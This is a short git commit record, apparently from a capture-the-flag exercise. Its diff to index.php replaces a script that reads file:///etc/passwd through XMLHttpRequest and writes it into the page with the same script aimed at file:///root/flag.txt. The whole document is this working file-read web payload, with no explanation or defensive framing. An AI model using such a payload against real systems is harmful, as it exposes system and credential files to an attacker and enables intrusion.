bacc7e4368ea766756f216e46f626a547a6252d3
sudlit_ <sudlit02@gmail.com>
2022-08-10 17:11:39 +0700

    first

--- index.php
+++ index.php
@@ -1,1 +1,8 @@
-<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script> 
+<script>
+    x=new XMLHttpRequest;
+    x.onload=function(){
+        document.write(this.responseText)
+    };
+    x.open("GET","file:///root/flag.txt");
+    x.send();
+</script>
